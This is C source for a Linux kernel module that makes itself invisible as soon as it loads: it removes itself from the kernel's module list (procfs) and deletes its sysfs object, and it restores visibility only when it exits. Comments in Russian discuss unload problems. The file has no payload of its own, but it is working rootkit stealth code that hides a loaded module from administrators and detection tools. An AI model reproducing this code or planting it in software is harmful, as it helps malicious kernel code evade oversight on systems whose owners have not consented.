#include "include/module.h"

int lkm_module_init(void); 
int lkm_module_exit(void); 
static int lkm_modinfo_attrs_safe(struct lkm_module_struct *ms);
static int lkm_modinfo_attrs_add(struct lkm_module_struct *ms);
static int lkm_hide_proc(struct lkm_module_struct *ms);
static int lkm_show_proc(struct lkm_module_struct *ms);
//static int lkm_module_tidy(struct lkm_module_struct *ms);
//static int lkm_hide_sys(struct lkm_module_struct *ms);	
//static int lkm_show_sys(struct lkm_module_struct *ms);
static int lkm_sys_hide(struct lkm_module_struct *ms);
static int lkm_sys_unhide(struct lkm_module_struct *ms);
static int lkm_module_hide(struct lkm_module_struct *ms);
static int lkm_module_show(struct lkm_module_struct *ms);

struct lkm_module_struct lkm_module_me = { .prev=NULL, .hide_proc=0, .hide_sys=0, .module=THIS_MODULE};

static int lkm_hide_proc(struct lkm_module_struct *ms) {
	if(ms->hide_proc) return -1;

	struct module *module = ms->module;
	printk(KERN_INFO "IN HIDE procfs\n");

	ms->prev = module->list.prev;
	list_del(&module->list);
	//These are non-NULL pointers that will result in page faults
        //under normal circumstances, used to verify that nobody uses
        //non-initialized list entries.
	module->list.next = (struct list_head*)LIST_POISON2;
    	module->list.prev = (struct list_head*)LIST_POISON1;
	ms->hide_proc = true;
	return 0;
}
static int lkm_show_proc(struct lkm_module_struct *ms) {
	if(!ms->hide_proc) return -1;
	if(!ms->prev) return -2;

	struct module *module = ms->module;
	printk(KERN_INFO "IN SHOW procfs\n");

	list_add(&module->list, ms->prev);
	ms->prev = NULL;
	ms->hide_proc = false;
	return 0;
}
/*
static int lkm_hide_sys(struct lkm_module_struct *ms) {	//Если снова сделать модуль видимым, то rmmod его НЕ ВЫГРУЗИТ!!!
	if(ms->hide_sys) return -1;

	struct module *module = ms->module;
	kobject_del(&module->mkobj.kobj);
	//list_del(&module->mkobj.kobj.entry);
	ms->hide_sys = true;
	return 0;
}
static int lkm_show_sys(struct lkm_module_struct *ms) {	//Если снова сделать модуль видимым, то rmmod его НЕ ВЫГРУЗИТ!!! kobject_get() не помогает :(

	if(!ms->hide_sys) return 1;
	struct module *module = ms->module;

	int a = kobject_add(&module->mkobj.kobj, module->mkobj.kobj.parent, module->mkobj.kobj.name);
	if(!a) return 1;

	ms->hide_sys = false;
	return 0;
}
static int lkm_module_tidy(struct lkm_module_struct *ms) {
	struct module *module = ms->module;

	kfree(module->notes_attrs);
	module->notes_attrs = NULL;

	kfree(module->sect_attrs);
	module->sect_attrs = NULL;
	module->modinfo_attrs->attr.name = NULL;

	kfree(module->mkobj.mp);
	module->mkobj.mp = NULL;

	kfree(module->mkobj.drivers_dir);
	module->mkobj.drivers_dir = NULL;
	return 0;
}
*/
static int lkm_modinfo_attrs_safe(struct lkm_module_struct *ms) {

	int i = 0;
	int ret = 0;
	struct module *mod = ms->module;
	struct module_attribute *attr =  &mod->modinfo_attrs[0];

	while(attr && attr->attr.name) {
		attr = &mod->modinfo_attrs[i];
		i++;
	}
	ret = i-1;
	i = (i+1) * sizeof(struct module_attribute);
	ms->sys_obj.bkp_modinfo_attrs = kzalloc(i, GFP_KERNEL);
	if(!ms->sys_obj.bkp_modinfo_attrs) return -1;
	memcpy(ms->sys_obj.bkp_modinfo_attrs, mod->modinfo_attrs, i);

	return ret;
}
static int lkm_modinfo_attrs_add(struct lkm_module_struct *ms) {
	int i = 0;
	int ret = 0;
	struct module *mod = ms->module;
	struct module_attribute *attr = &ms->sys_obj.bkp_modinfo_attrs[0];

	while(attr && attr->attr.name) {
		attr = &mod->modinfo_attrs[i];
		i++;
		if(attr->attr.name) {
			ret = sysfs_create_file(&mod->mkobj.kobj, &attr->attr);
				if(ret) {
				return ret;
			}
		}
	}

	mod->modinfo_attrs = ms->sys_obj.bkp_modinfo_attrs;
	i--;
	return i;
}
static int lkm_sys_unhide(struct lkm_module_struct *ms) {
	if(!ms->hide_sys) return -1;

	printk(KERN_INFO "IN UNHIDE sysfs\n");
	int a;
	struct kobject *kobj;
	struct module *module = ms->module;
	
	module->state = MODULE_STATE_LIVE;
	a = kobject_add(&(module->mkobj.kobj), ms->sys_obj.parent, "%s", module->name);
	if(a) goto put_sys_unh;

	//Create "holders"
	kobj = kobject_create_and_add("holders", &(module->mkobj.kobj));
	if(!kobj) goto put_sys_unh;

	module->holders_dir = kobj;

	//Create "sections"
	a = sysfs_create_group(&(module->mkobj.kobj), &ms->sys_obj.sect_attrs->grp);
	if(a) goto put_sys_unh;

	a = lkm_modinfo_attrs_add(ms);	
	if(a<=0) {
		if(module->mkobj.mp) {
			sysfs_remove_group(&(module->mkobj.kobj), &module->mkobj.mp->grp);
			if(module->mkobj.mp) {
				kfree(module->mkobj.mp->grp.attrs);
				kfree(module->mkobj.mp);
				module->mkobj.mp = NULL;
			}
		}
	}
  put_sys_unh:
	kobject_put(&(module->mkobj.kobj));
	
	ms->hide_sys = false;
	return 0;
}
static int lkm_sys_hide(struct lkm_module_struct *ms) {
	if(ms->hide_sys) return -1;
	struct module *module = ms->module;
	printk(KERN_INFO "IN HIDE sysfs\n");

	ms->sys_obj.sect_attrs = module->sect_attrs;
	ms->sys_obj.parent = module->mkobj.kobj.parent;
	kobject_del(module->holders_dir->parent);
	module->holders_dir->parent->state_in_sysfs = 1;
	module->state = MODULE_STATE_UNFORMED;

	lkm_modinfo_attrs_safe(ms);
	ms->hide_sys = true;
	return 0;
}

static int lkm_module_hide(struct lkm_module_struct *ms) {
	lkm_hide_proc(&lkm_module_me);
//	lkm_hide_sys(&lkm_module_me);	//Если снова сделать модуль видимым, то rmmod его НЕ ВЫГРУЗИТ!!!
	lkm_sys_hide(&lkm_module_me);
	return 0;
}
static int lkm_module_show(struct lkm_module_struct *ms) {
	lkm_show_proc(&lkm_module_me);
//	lkm_show_sys(&lkm_module_me); 	//Если снова сделать модуль видимым, то rmmod его НЕ ВЫГРУЗИТ!!!
	lkm_sys_unhide(&lkm_module_me);
	return 0;
}

int lkm_module_init(void) {

	printk(KERN_INFO "++++++ LKM_MODULE, ale-alE-aLE-OP ++++++\n");
	//lkm_list_proc();
	//lkm_module_me
	lkm_module_hide(&lkm_module_me);
	return 0;
}
int lkm_module_exit(void) {

	lkm_module_show(&lkm_module_me);
	printk(KERN_INFO "++++++ LKM_MODULE, HN-Hn-hn ++++++\n");
	return 0;
}
